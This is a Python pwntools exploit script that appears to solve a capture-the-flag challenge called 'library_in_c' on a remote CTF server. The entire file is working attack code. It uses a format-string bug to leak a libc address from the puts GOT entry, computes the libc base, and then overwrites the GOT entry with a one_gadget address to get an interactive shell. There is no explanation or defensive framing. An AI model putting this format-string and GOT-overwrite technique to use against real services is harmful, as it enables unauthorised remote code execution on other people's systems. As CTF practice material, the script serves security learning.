from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./library_in_c"
HOST = "shell.actf.co"
PORT = 20201 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_puts = elf.plt["puts"]
plt_printf = elf.plt["printf"]
got_puts = elf.got["puts"]
got_fgets = elf.got["fgets"]

libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]

gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	fsb_off = 8
	fsb_off2 = 16
	payload = "%14$s,AAA"
	payload += "\x00"*(0x30-len(payload))
	payload += p64(got_puts)
	conn.sendlineafter("name?\n", payload)
	
	conn.recvuntil("there ")
	libc_puts = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_puts - off_puts
	one_gadget = libc_base + gadget[1]
	print hex(libc_base)

	payload = fsb(2, fsb_off2+(0x28/8), one_gadget, 0, 2)
	payload += "\x00"*(0x28-len(payload))
	payload += p64(got_puts)
	payload += p64(got_puts+2)
	
	conn.sendlineafter("out?", payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
